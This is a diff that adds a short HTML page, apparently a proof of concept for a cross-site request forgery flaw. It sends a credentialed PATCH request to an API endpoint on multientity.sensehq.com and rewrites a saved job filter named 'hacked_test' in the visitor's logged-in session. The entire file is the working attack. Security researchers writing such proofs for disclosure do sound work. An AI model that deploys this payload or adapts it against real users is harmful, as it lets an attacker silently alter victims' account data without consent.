@@ -1,0 +1,17 @@
+<html>
+<body>
+  <button onclick="csrf()">Click me</button>
+<script>
+function csrf() {
+  fetch("https://multientity.sensehq.com/bff/api/v1/filter/15426", {
+    method: "PATCH",
+    credentials: "include",  
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({"id":15426,"name":"SKS job list (hacked_test)","rule":{"all":false,"inclusions":{"blocks":[{"rules":[{"conditions":[{"field":{"entity_type":"bh_job_order","attribute_name":"id","from_relations":[],"base_entity_type":"bh_job_order"},"value":"sagar-alliedhealth-audiologist","operator":"eq","metadata":null,"offset":null,"include_null":false}]}]}]},"exclusions":{"blocks":[]}}}))
+  });
+}
+</script>
+</body>
+</html>
